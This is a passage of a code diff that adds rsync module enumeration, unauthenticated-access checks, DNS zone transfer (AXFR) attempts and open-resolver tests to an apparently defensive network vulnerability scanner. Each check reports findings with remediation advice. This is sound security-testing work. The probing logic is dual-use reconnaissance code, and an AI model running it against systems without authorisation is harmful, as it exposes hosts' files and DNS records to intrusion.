+      remediation="Restrict rsync access to trusted networks; require authentication for all modules.",
+      cwe_id="CWE-200",
+      confidence="certain",
+    ))
+
+    # --- 2. Module enumeration ---
+    try:
+      # Send matching version handshake + list request
+      sock.sendall(f"@RSYNCD: {proto_version}\n".encode())
+      sock.sendall(b"#list\n")
+      # Read module listing until @RSYNCD: EXIT
+      module_data = b""
+      while True:
+        chunk = sock.recv(4096)
+        if not chunk:
+          break
+        module_data += chunk
+        if b"@RSYNCD: EXIT" in module_data:
+          break
+      sock.close()
+
+      modules = []
+      for line in module_data.decode("utf-8", errors="ignore").splitlines():
+        line = line.strip()
+        if line.startswith("@RSYNCD:") or not line:
+          continue
+        # Format: "module_name\tdescription" or just "module_name"
+        parts = line.split("\t", 1)
+        mod_name = parts[0].strip()
+        mod_desc = parts[1].strip() if len(parts) > 1 else ""
+        if mod_name:
+          modules.append({"name": mod_name, "description": mod_desc})
+
+      raw["modules"] = modules
+
+      if modules:
+        mod_names = ", ".join(m["name"] for m in modules)
+        findings.append(Finding(
+          severity=Severity.HIGH,
+          title=f"Rsync module enumeration successful: {mod_names}",
+          description=f"Rsync on {target}:{port} exposes {len(modules)} module(s). "
+                      "Exposed modules may allow file read/write.",
+          evidence=f"Modules: {mod_names}",
+          remediation="Restrict module listing and require authentication for all rsync modules.",
+          owasp_id="A01:2021",
+          cwe_id="CWE-200",
+          confidence="certain",
+        ))
+    except Exception as e:
+      self.P(f"Rsync module enumeration failed on {target}:{port}: {e}", color='y')
+      try:
+        sock.close()
+      except Exception:
+        pass
+
+    # --- 3. Test unauthenticated access per module ---
+    for mod in raw["modules"]:
+      try:
+        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock2.settimeout(3)
+        sock2.connect((target, port))
+        sock2.recv(256)  # banner
+        sock2.sendall(f"@RSYNCD: {proto_version}\n".encode())
+        sock2.sendall(f"{mod['name']}\n".encode())
+        resp = sock2.recv(4096).decode("utf-8", errors="ignore")
+        sock2.close()
+
+        if "@RSYNCD: OK" in resp:
+          findings.append(Finding(
+            severity=Severity.CRITICAL,
+            title=f"Rsync module '{mod['name']}' accessible without authentication",
+            description=f"Module '{mod['name']}' on {target}:{port} allows unauthenticated access. "
+                        "An attacker can read or write arbitrary files within this module.",
+            evidence=f"Connected to module '{mod['name']}', received @RSYNCD: OK",
+            remediation=f"Add 'auth users' and 'secrets file' to the [{mod['name']}] section in rsyncd.conf.",
+            owasp_id="A01:2021",
+            cwe_id="CWE-284",
+            confidence="certain",
+          ))
+        elif "@ERROR" in resp and "auth" in resp.lower():
+          raw["modules"] = [
+            {**m, "auth_required": True} if m["name"] == mod["name"] else m
+            for m in raw["modules"]
+          ]
+      except Exception:
+        pass
+
+    return probe_result(raw_data=raw, findings=findings)
+
 
   def _service_info_vnc(self, target, port):  # default port: 5900
     """
@@ -2785,8 +3611,142 @@ class _ServiceInfoMixin:
     finally:
       if sock is not None:
         sock.close()
+
+    # --- DNS zone transfer (AXFR) test ---
+    axfr_findings = self._dns_test_axfr(target, port)
+    findings += axfr_findings
+
+    # --- Open recursive resolver test ---
+    resolver_finding = self._dns_test_open_resolver(target, port)
+    if resolver_finding:
+      findings.append(resolver_finding)
+
     return probe_result(raw_data=raw, findings=findings)
 
+  def _dns_test_axfr(self, target, port):
+    """Attempt DNS zone transfer (AXFR) via TCP.
+
+    Returns list of findings.
+    """
+    findings = []
+
+    # Derive domain from reverse DNS of target, or use a common test domain
+    test_domains = []
+    try:
+      import socket as _socket
+      hostname, _, _ = _socket.gethostbyaddr(target)
+      # Extract domain from hostname (e.g., "host.example.com" → "example.com")
+      parts = hostname.split(".")
+      if len(parts) >= 2:
+        test_domains.append(".".join(parts[-2:]))
+      if len(parts) >= 3:
+        test_domains.append(".".join(parts[-3:]))
+    except Exception:
+      pass
+
+    # Always test with the target itself as a domain if nothing else
+    if not test_domains:
+      test_domains = ["vulhub.org", "example.com"]
+
+    for domain in test_domains[:2]:  # Test at most 2 domains
+      try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        sock.connect((target, port))
+
+        # Build AXFR query
+        tid = random.randint(0, 0xffff)
+        header = struct.pack('>HHHHHH', tid, 0x0100, 1, 0, 0, 0)
+        # Encode domain name
+        qname = b""
+        for label in domain.split("."):
+          qname += bytes([len(label)]) + label.encode()
+        qname += b"\x00"
+        # QTYPE=252 (AXFR), QCLASS=1 (IN)
+        question = struct.pack('>HH', 252, 1)
+        dns_query = header + qname + question
+        # TCP DNS: 2-byte length prefix
+        sock.sendall(struct.pack(">H", len(dns_query)) + dns_query)
+
+        # Read response
+        resp_len_bytes = sock.recv(2)
+        if len(resp_len_bytes) < 2:
+          sock.close()
+          continue
+        resp_len = struct.unpack(">H", resp_len_bytes)[0]
+        resp_data = b""
+        while len(resp_data) < resp_len:
+          chunk = sock.recv(resp_len - len(resp_data))
+          if not chunk:
+            break
+          resp_data += chunk
+        sock.close()
+
+        # Parse: check if we got answers (ancount > 0) and no error (rcode = 0)
+        if len(resp_data) >= 12:
+          resp_tid = struct.unpack(">H", resp_data[0:2])[0]
+          flags = struct.unpack(">H", resp_data[2:4])[0]
+          rcode = flags & 0x0F
+          ancount = struct.unpack(">H", resp_data[6:8])[0]
+
+          if resp_tid == tid and rcode == 0 and ancount > 0:
+            findings.append(Finding(
+              severity=Severity.HIGH,
+              title=f"DNS zone transfer (AXFR) allowed for {domain}",
+              description=f"DNS on {target}:{port} permits zone transfers for '{domain}'. "
+                          "This leaks all DNS records — hostnames, IPs, mail servers, internal infrastructure.",
+              evidence=f"AXFR query returned {ancount} answer records for {domain}.",
+              remediation="Restrict zone transfers to authorized secondary nameservers only (allow-transfer).",
+              owasp_id="A01:2021",
+              cwe_id="CWE-200",
+              confidence="certain",
+            ))
+            break  # One confirmed AXFR is enough
+      except Exception:
+        continue
+
+    return findings
+
+  def _dns_test_open_resolver(self, target, port):
+    """Test if DNS server acts as an open recursive resolver.
+
+    Returns Finding or None.
+    """
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      sock.settimeout(2)
+      tid = random.randint(0, 0xffff)
+      # Standard recursive query for example.com A record
+      header = struct.pack('>HHHHHH', tid, 0x0100, 1, 0, 0, 0)  # RD=1
+      qname = b'\x07example\x03com\x00'
+      question = struct.pack('>HH', 1, 1)  # QTYPE=A, QCLASS=IN
+      packet = header + qname + question
+      sock.sendto(packet, (target, port))
+      data, _ = sock.recvfrom(512)
+      sock.close()
+
+      if len(data) >= 12 and struct.unpack('>H', data[:2])[0] == tid:
+        flags = struct.unpack('>H', data[2:4])[0]
+        qr = (flags >> 15) & 1
+        rcode = flags & 0x0F
+        ancount = struct.unpack('>H', data[6:8])[0]
+        ra = (flags >> 7) & 1  # Recursion Available
+
+        if qr == 1 and rcode == 0 and ancount > 0 and ra == 1:
+          return Finding(
+            severity=Severity.MEDIUM,
+            title="DNS open recursive resolver detected",
+            description=f"DNS on {target}:{port} recursively resolves queries for external domains. "
+                        "Open resolvers can be abused for DNS amplification DDoS attacks.",
+            evidence=f"Recursive query for example.com returned {ancount} answers with RA flag set.",
+            remediation="Restrict recursive queries to authorized clients only (allow-recursion).",
+            owasp_id="A05:2021",
+            cwe_id="CWE-406",
+            confidence="certain",
+          )
+    except Exception:
+      pass
+    return None
 
   def _service_info_mssql(self, target, port):  # default port: 1433
     """
